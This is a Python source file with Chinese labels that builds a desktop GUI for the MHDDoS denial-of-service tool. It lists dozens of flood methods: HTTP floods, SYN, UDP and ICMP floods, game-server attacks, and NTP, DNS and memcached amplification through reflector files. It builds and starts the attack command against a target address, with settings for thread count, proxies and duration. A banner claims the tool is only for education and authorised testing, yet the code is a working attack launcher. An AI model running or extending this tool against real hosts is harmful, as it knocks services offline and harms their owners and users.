#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MHDDoS专用GUI界面
集成MHDDoS程序的全部功能
⚠️ 仅用于教育和授权的安全测试
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import subprocess
import threading
import time
import os
from pathlib import Path

class MHDDoS_Dedicated_GUI:
    """MHDDoS专用GUI界面"""
    
    def __init__(self, root):
        self.root = root
        self.root.title("MHDDoS专用攻击工具")
        self.root.geometry("900x700")
        self.root.resizable(True, True)
        
        # 攻击状态
        self.is_attacking = False
        self.attack_process = None
        
        # 创建界面
        self.create_interface()
        
        # 加载MHDDoS方法
        self.load_methods()
    
    def create_interface(self):
        """创建界面"""
        # 主框架
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # 配置网格权重
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        
        # 标题
        title_label = ttk.Label(main_frame, text="MHDDoS专用攻击工具", 
                               font=("Arial", 16, "bold"))
        title_label.grid(row=0, column=0, columnspan=3, pady=(0, 20))
        
        # 安全警告
        warning_label = ttk.Label(main_frame, 
                                 text="⚠️ 重要提醒: 此工具仅用于教育和授权的安全测试",
                                 foreground="red", font=("Arial", 10, "bold"))
        warning_label.grid(row=1, column=0, columnspan=3, pady=(0, 10))
        
        # 攻击参数区域
        params_frame = ttk.LabelFrame(main_frame, text="攻击参数", padding="10")
        params_frame.grid(row=2, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
        params_frame.columnconfigure(1, weight=1)
        
        # 攻击方法选择
        ttk.Label(params_frame, text="攻击方法:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.method_var = tk.StringVar(value="GET")
        self.method_combo = ttk.Combobox(params_frame, textvariable=self.method_var, width=20)
        self.method_combo.grid(row=0, column=1, sticky=(tk.W, tk.E), pady=5, padx=(5, 0))
        
        # 目标地址
        ttk.Label(params_frame, text="目标地址:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.target_var = tk.StringVar(value="http://httpbin.org/get")
        self.target_entry = ttk.Entry(params_frame, textvariable=self.target_var, width=50)
        self.target_entry.grid(row=1, column=1, sticky=(tk.W, tk.E), pady=5, padx=(5, 0))
        
        # 线程数
        ttk.Label(params_frame, text="线程数:").grid(row=2, column=0, sticky=tk.W, pady=5)
        self.threads_var = tk.StringVar(value="100")
        self.threads_entry = ttk.Entry(params_frame, textvariable=self.threads_var, width=10)
        self.threads_entry.grid(row=2, column=1, sticky=tk.W, pady=5, padx=(5, 0))
        
        # 攻击时长
        ttk.Label(params_frame, text="攻击时长(秒):").grid(row=3, column=0, sticky=tk.W, pady=5)
        self.duration_var = tk.StringVar(value="60")
        self.duration_entry = ttk.Entry(params_frame, textvariable=self.duration_var, width=10)
        self.duration_entry.grid(row=3, column=1, sticky=tk.W, pady=5, padx=(5, 0))
        
        # 代理类型
        ttk.Label(params_frame, text="代理类型:").grid(row=4, column=0, sticky=tk.W, pady=5)
        self.proxy_type_var = tk.StringVar(value="0")
        self.proxy_type_combo = ttk.Combobox(params_frame, textvariable=self.proxy_type_var, 
                                            values=["0", "1", "4", "5", "6"], width=10)
        self.proxy_type_combo.grid(row=4, column=1, sticky=tk.W, pady=5, padx=(5, 0))
        
        # 代理文件
        ttk.Label(params_frame, text="代理文件:").grid(row=5, column=0, sticky=tk.W, pady=5)
        self.proxy_file_var = tk.StringVar(value="http.txt")
        self.proxy_file_combo = ttk.Combobox(params_frame, textvariable=self.proxy_file_var,
                                            values=["http.txt", "socks4.txt", "socks5.txt"], width=15)
        self.proxy_file_combo.grid(row=5, column=1, sticky=tk.W, pady=5, padx=(5, 0))
        
        # RPC参数
        ttk.Label(params_frame, text="RPC:").grid(row=6, column=0, sticky=tk.W, pady=5)
        self.rpc_var = tk.StringVar(value="10")
        self.rpc_entry = ttk.Entry(params_frame, textvariable=self.rpc_var, width=10)
        self.rpc_entry.grid(row=6, column=1, sticky=tk.W, pady=5, padx=(5, 0))
        
        # 控制按钮区域
        buttons_frame = ttk.Frame(main_frame)
        buttons_frame.grid(row=3, column=0, columnspan=3, pady=10)
        
        self.start_button = ttk.Button(buttons_frame, text="开始攻击", 
                                      command=self.start_attack)
        self.start_button.pack(side=tk.LEFT, padx=5)
        
        self.stop_button = ttk.Button(buttons_frame, text="停止攻击", 
                                     command=self.stop_attack, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)
        
        self.clear_button = ttk.Button(buttons_frame, text="清空输出", 
                                      command=self.clear_output)
        self.clear_button.pack(side=tk.LEFT, padx=5)
        
        # 输出区域
        output_frame = ttk.LabelFrame(main_frame, text="攻击输出", padding="10")
        output_frame.grid(row=4, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(10, 0))
        output_frame.columnconfigure(0, weight=1)
        output_frame.rowconfigure(0, weight=1)
        main_frame.rowconfigure(4, weight=1)
        
        self.output_text = scrolledtext.ScrolledText(output_frame, width=80, height=20)
        self.output_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # 状态栏
        self.status_var = tk.StringVar(value="就绪")
        status_label = ttk.Label(main_frame, textvariable=self.status_var, relief=tk.SUNKEN)
        status_label.grid(row=5, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(10, 0))
    
    def load_methods(self):
        """加载MHDDoS攻击方法"""
        methods = [
            # Layer7方法
            "GET", "POST", "CFB", "BYPASS", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
            "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
            "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP",
            # Layer4方法
            "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MCBOT", "CONNECTION", "CPS", 
            "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP",
            # 放大攻击方法
            "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"
        ]
        
        self.method_combo['values'] = methods
        
        # 添加方法描述
        self.method_descriptions = {
            "GET": "HTTP GET请求洪水攻击",
            "POST": "HTTP POST请求洪水攻击",
            "TCP": "TCP连接洪水攻击",
            "UDP": "UDP数据包洪水攻击",
            "SYN": "SYN洪水攻击",
            "ICMP": "ICMP洪水攻击",
            "NTP": "NTP放大攻击",
            "DNS": "DNS放大攻击",
            "MINECRAFT": "Minecraft服务器攻击"
        }
        
        # 绑定方法选择事件
        self.method_combo.bind('<<ComboboxSelected>>', self.on_method_selected)
    
    def on_method_selected(self, event):
        """方法选择事件"""
        method = self.method_var.get()
        description = self.method_descriptions.get(method, "未知攻击方法")
        self.append_output(f"选择方法: {method} - {description}\n")
    
    def append_output(self, text):
        """添加输出文本"""
        self.output_text.insert(tk.END, text)
        self.output_text.see(tk.END)
        self.root.update()
    
    def clear_output(self):
        """清空输出"""
        self.output_text.delete(1.0, tk.END)
    
    def validate_parameters(self):
        """验证参数"""
        try:
            method = self.method_var.get().strip()
            target = self.target_var.get().strip()
            threads = int(self.threads_var.get())
            duration = int(self.duration_var.get())
            
            if not method:
                messagebox.showerror("错误", "请选择攻击方法")
                return False
            
            if not target:
                messagebox.showerror("错误", "请输入目标地址")
                return False
            
            if threads <= 0 or threads > 10000:
                messagebox.showerror("错误", "线程数应在1-10000之间")
                return False
            
            if duration <= 0 or duration > 3600:
                messagebox.showerror("错误", "攻击时长应在1-3600秒之间")
                return False
            
            return True
            
        except ValueError:
            messagebox.showerror("错误", "参数格式错误，请检查输入")
            return False
    
    def build_command(self):
        """构建MHDDoS命令"""
        method = self.method_var.get().upper()
        target = self.target_var.get().strip()
        threads = self.threads_var.get()
        duration = self.duration_var.get()
        proxy_type = self.proxy_type_var.get()
        proxy_file = self.proxy_file_var.get()
        rpc = self.rpc_var.get()
        
        # 基本命令
        cmd = ["python", "start.py", method, target]
        
        # Layer7方法参数
        if method in ["GET", "POST", "CFB", "BYPASS", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
                     "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
                     "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"]:
            cmd.extend([proxy_type, threads, proxy_file, rpc, duration])
        
        # Layer4方法参数
        else:
            cmd.extend([threads, duration])
            
            # 放大攻击需要反射器文件
            if method in ["MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"]:
                cmd.append("reflectors.txt")
        
        return cmd
    
    def start_attack(self):
        """开始攻击"""
        if not self.validate_parameters():
            return
        
        # 安全确认
        if not messagebox.askyesno("确认", "⚠️ 此工具仅用于教育和授权的安全测试\n\n确认开始攻击？"):
            return
        
        self.is_attacking = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.status_var.set("攻击进行中...")
        
        # 构建命令
        cmd = self.build_command()
        
        self.append_output("=" * 60 + "\n")
        self.append_output("🎯 开始MHDDoS攻击\n")
        self.append_output(f"命令: {' '.join(cmd)}\n")
        self.append_output("=" * 60 + "\n")
        
        # 在后台线程中运行攻击
        attack_thread = threading.Thread(target=self.run_attack, args=(cmd,))
        attack_thread.daemon = True
        attack_thread.start()
    
    def run_attack(self, cmd):
        """运行攻击"""
        try:
            self.append_output("[INFO] 启动攻击进程...\n")
            
            # 运行MHDDoS程序
            self.attack_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            # 实时读取输出
            for line in iter(self.attack_process.stdout.readline, ''):
                if not self.is_attacking:
                    break
                self.append_output(line)
            
            # 等待进程结束
            self.attack_process.wait()
            
            if self.is_attacking:
                self.append_output("\n[INFO] 攻击完成\n")
                self.status_var.set("攻击完成")
            else:
                self.append_output("\n[INFO] 攻击已停止\n")
                self.status_var.set("攻击已停止")
                
        except Exception as e:
            self.append_output(f"\n[ERROR] 攻击错误: {e}\n")
            self.status_var.set("攻击错误")
        
        finally:
            self.is_attacking = False
            self.root.after(0, self.reset_ui)
    
    def stop_attack(self):
        """停止攻击"""
        self.is_attacking = False
        
        if self.attack_process:
            try:
                self.attack_process.terminate()
                self.attack_process.wait(timeout=5)
            except:
                try:
                    self.attack_process.kill()
                except:
                    pass
        
        self.append_output("\n[INFO] 正在停止攻击...\n")
        self.status_var.set("正在停止...")
    
    def reset_ui(self):
        """重置UI状态"""
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        
        if not self.is_attacking:
            self.status_var.set("就绪")

def main():
    """主函数"""
    root = tk.Tk()
    app = MHDDoS_Dedicated_GUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()